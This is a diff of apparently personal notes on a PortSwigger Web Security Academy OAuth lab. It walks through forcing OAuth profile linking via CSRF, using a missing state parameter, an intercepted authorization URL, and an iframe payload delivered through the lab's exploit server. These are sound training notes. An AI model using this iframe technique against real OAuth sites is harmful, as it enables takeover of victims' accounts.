@@ -28,11 +28,20 @@ Connection: close
 {"email":"carlos@carlos-montoya.net","username":"carlos","token":"tY2Y8c57C6kHCy8X3BxnE4Hm3YoJyeOfMuhjlkFSQeb"}
 ````
 
-### >> 2. 
+### >> 2. Lab: Forced OAuth profile linking
 
+- The request sends the authorization code to the /oauth-login `redirect_uri`
+- There is no `state` parameter in the oauth, so it might be vulnerable to CSRF
 ````
-Your username is: wiener
-Your email is: wiener@hotdog.com
-Your API Key is: ux9JvKvqHiuWs4byoGWJ8Bp4AtRij6Ce
+https://oauth-ac4e1f2d1eaf72afc0ae569802f400e3.web-security-academy.net/auth?client_id=j2ba7uqsy1y35kw1wmd5o&redirect_uri=https://ac0b1f681ee77200c0b65677005800f5.web-security-academy.net/oauth-login&response_type=code&scope=openid%20profile%20email
+````
 
+- Run the first login complete and then click to attach a social profile again, but now with interception on on burp
+- Drop this request and copy the URL; perform logout
+- Create a iframe object and delivery it to the victm using the Exploit server
 ````
+<iframe src="https://ac0b1f681ee77200c0b65677005800f5.web-security-academy.net/oauth-linking?code=LTpkSauiz5Y_iiFdFkmU7jTvtADFySL_sOGqSWMgysp"></iframe>
+````
+- Click now in Login with Social Media and delete the Carlos user to complete the lab
+
+### >> 3.
